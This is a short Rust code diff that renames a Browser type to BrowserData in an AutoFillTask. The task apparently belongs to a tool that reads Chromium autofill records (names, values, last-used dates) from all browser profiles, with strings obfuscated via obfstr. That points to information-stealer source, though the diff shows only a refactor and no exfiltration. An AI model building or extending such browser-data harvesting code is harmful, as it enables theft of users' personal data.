@@ -6,7 +6,7 @@ use alloc::vec::Vec;
 use tasks::{parent_name, Task};
 use utils::path::Path;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, AutoFill};
-use crate::chromium::Browser;
+use crate::chromium::BrowserData;
 use obfstr::obfstr as s;
 
 const AUTOFILL_NAME: usize           = 0;
@@ -14,11 +14,11 @@ const AUTOFILL_VALUE: usize          = 1;
 const AUTOFILL_DATE_LAST_USED: usize = 4;
 
 pub(super) struct AutoFillTask {
-    browser: Arc<Browser>,
+    browser: Arc<BrowserData>,
 }
 
 impl AutoFillTask {
-    pub(super) fn new(browser: Arc<Browser>) -> Self {
+    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
         Self { browser }
     }
 }
